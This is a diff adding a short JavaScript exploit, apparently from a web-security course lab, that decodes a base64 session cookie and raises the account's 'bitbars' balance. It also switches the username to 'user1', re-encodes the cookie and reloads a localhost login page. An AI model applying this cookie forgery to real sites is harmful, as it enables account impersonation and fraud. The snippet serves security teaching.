@@ -1,0 +1,10 @@
+var c = document.cookie.substring(8); // this is so session=is taken off
+var obj = JSON.parse(atob(c)); // use parse function described in Ed and atob from here
+
+console.log(obj); 
+obj.account.bitbars = 200;
+obj.account.username = "user1";
+
+var cook = btoa(JSON.stringify(obj)); 
+document.cookie = "session=" + cook; // you can set the cookie like this and then reload the page like in the code below
+window.location.replace("http://localhost:3000/login");
